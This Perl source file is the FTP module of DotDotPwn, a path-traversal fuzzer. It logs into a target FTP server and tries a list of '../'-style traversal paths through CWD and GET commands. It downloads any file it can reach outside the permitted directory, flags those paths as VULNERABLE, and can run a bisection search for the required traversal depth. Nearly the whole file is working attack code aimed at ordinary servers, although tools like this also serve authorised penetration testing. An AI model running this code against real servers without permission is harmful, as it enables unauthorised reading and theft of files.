#!/usr/bin/perl
# 
# Package to craft and send the FTP requests
# by chr1x & nitr0us
# 

package DotDotPwn::FTP;
use Exporter 'import';
@EXPORT = qw(FuzzFTP);

use DotDotPwn::BisectionAlgorithm;

use Net::FTP;
use Time::HiRes qw(usleep);

use DotDotPwn::File; # To split the traversal string into its corresponding dirname and filename (cwd and get)

sub FuzzFTP{
	my ($host, $port, $user, $pass, $bisection_request) = @_;
	our $n_travs = 0;
	my $dirname, $filename;
	my $foo = 0; # Used as an auxiliary variable in quiet mode (see below)

	if(!$bisection_request){
		open(REPORT , ">>$main::report");

		for my $fh (STDOUT, REPORT) {
			print $fh "[+] Username: $user\n";
			print $fh "[+] Password: $pass\n";

			print $fh "[+] Connecting to the FTP server at '$host' on port $port\n";
		}
	}

	$ftp = Net::FTP->new($host,
				Debug => 0,
				Port => $port) or die "[-] Cannot connect to $host: $@\n";

        $ftp->login($user, $pass) or die "[-] Cannot login ($user:$pass): ", $ftp->message;

	if(!$bisection_request){
		for my $fh (STDOUT, REPORT) { print $fh "[+] FTP Server's Current Path: " . $ftp->pwd() . "\n"; }

		chdir "retrieved_files";
		for my $fh (STDOUT, REPORT) { print $fh "[+] Local Path to download files: " . `pwd`; }

		print "[+] Press Enter to continue\n";
		<STDIN>;
		print "[+] Testing ...\n";
	}

	# Return 1 (vulnerable) or 0 (not vulnerable) to BisectionAlgorithm()
	if($bisection_request){
		($dirname, $filename) = split_dirname_filename($bisection_request);

		# First try: Change to the specified dir (traversal) and try to get the file
		$ftp->cwd($dirname);
		if($ftp->code eq "250"){ # (nitr0us) RFC 959 (FTP): Respose code for a successful CWD (250)
			$ftp->get($filename);

			if ($ftp->code eq "226"){ # (nitr0us) RFC 959 (FTP): Respose code for a successful GET (226)
				$ftp->quit;
				return 1; # Vulnerable
			}
		}

		$ftp->cwd("/"); # Change to root path for integrity

		# Second try: Retrive the file directly with the "get" command
		$ftp->get($bisection_request);
		if ($ftp->code eq "226"){ # (nitr0us) RFC 959 (FTP): Respose code for a successful GET
			$ftp->quit;
			return 1; # Vulnerable
		}

		$ftp->quit;
		return 0; # Not Vulnerable

	}

        foreach $traversal (@main::traversals){
		($dirname, $filename) = split_dirname_filename($traversal);

		# First try: Change to the specified dir (traversal) and try to get the file
		$ftp->cwd($dirname);
		if($ftp->code eq "250"){ # (nitr0us) RFC 959 (FTP): Respose code for a successful CWD (250)
			$ftp->get($filename);

			if ($ftp->code eq "226"){ # (nitr0us) RFC 959 (FTP): Respose code for a successful GET (226)
				for my $fh (STDOUT, REPORT) { print $fh "\n[*] CD $dirname | GET $filename <- VULNERABLE!\n"; }
				$n_travs++;

				if($main::bisect){
					print "\n[========= BISECTION ALGORITHM  =========]\n\n";
					DotDotPwn::BisectionAlgorithm::BisectionAlgorithm(1, $main::bisdeep, $traversal);

					return 1;
				}

				return $n_travs if $main::break;

				usleep($main::time);
				next;
			}
		}

		$ftp->cwd("/"); # Change to root path for integrity

		# Second try: Retrive the file directly with the "get" command
		$ftp->get($traversal);
		if ($ftp->code eq "226"){ # (nitr0us) RFC 959 (FTP): Respose code for a successful GET
			for my $fh (STDOUT, REPORT) { print $fh "\n[*] GET $traversal <- VULNERABLE!\n"; }
			$n_travs++;

			if($main::bisect){
				print "\n[========= BISECTION ALGORITHM  =========]\n\n";
				DotDotPwn::BisectionAlgorithm::BisectionAlgorithm(1, $main::bisdeep, $traversal);

				return 1;
			}

			return $n_travs if $main::break;

			usleep($main::time);
			next;
		}

		if($main::quiet){
			print ". " unless $foo++ % $main::dot_quiet_mode;
		} else{
			print "[*] Testing Path: $traversal\n";
		}

		usleep($main::time);
        }

        $ftp->quit;

	return $n_travs;
}
